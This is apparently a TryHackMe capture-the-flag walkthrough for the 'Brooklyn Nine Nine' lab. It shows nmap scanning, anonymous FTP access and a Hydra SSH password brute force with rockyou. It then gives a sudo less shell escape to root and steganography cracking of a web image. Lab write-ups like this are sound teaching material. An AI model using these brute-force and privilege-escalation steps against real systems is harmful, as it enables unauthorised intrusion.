## ğŸ•µâ€â™‚ TryHackMe: Brooklyn Nine Nine â€“ Walkthrough

### ğŸ¯ Objective:

Gain initial access to the machine, escalate privileges, and capture both user and root flags using multiple techniques including brute force, FTP enumeration, and steganography.

---

## 1. ğŸ” Network Enumeration

Use nmap to scan for open ports and running services:

nmap -sC -sV -p- -oN fullscan.txt <TARGET_IP>


### Findings:

* *Port 21 (FTP)* â€” Allows anonymous login
* *Port 22 (SSH)* â€” OpenSSH, potential entry point with valid credentials
* *Port 80 (HTTP)* â€” Apache2, hosting a static image page

---

## 2. ğŸ“ FTP Access (Port 21)

Attempt anonymous FTP login:

ftp <TARGET_IP>


Youâ€™ll find a file:


note_to_jake.txt


*Contents:*


Jake,
Please remember to change your password. Itâ€™s way too weak and can be brute-forced easily.

- Captain Holt


â¡ This hints that Jakeâ€™s SSH password can likely be cracked via brute force.

---

## 3. ğŸ” SSH Brute Forcing

Use Hydra to brute-force Jakeâ€™s password:

hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>


After a few seconds/minutes, youâ€™ll obtain valid credentials:


jake:<password>


---

## 4. ğŸ§‘â€ğŸ’» User Shell Access

Login using SSH:

ssh jake@<TARGET_IP>


Check for flags:

find /home -name user.txt 2>/dev/null
cat /home/holt/user.txt


âœ… *User Flag obtained.*

---

## 5. â¬† Privilege Escalation (Jake â†’ Root)

Check Jakeâ€™s sudo permissions:

sudo -l


Result:


(ALL) NOPASSWD: /usr/bin/less


Since less is a text reader, but allows shell escape, you can exploit this:

sudo less /etc/profile


Once in the less viewer, type:


!sh


ğŸ’¥ This spawns a root shell!

Get the root flag:

cat /root/root.txt


âœ… *Root Flag obtained.*

---

## ğŸ§  Alternative Path: Steganography Route

Inspect the HTTP server. Download the image shown on the webpage:

wget http://<TARGET_IP>/brooklyn99.jpg


Use steganography to find hidden data:

stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt


Output:


Found passphrase: holt:<password>


Login via SSH:

ssh holt@<TARGET_IP>


Check sudo access:

sudo -l


If holt also has permissions for less, use the same exploit to get root.

---


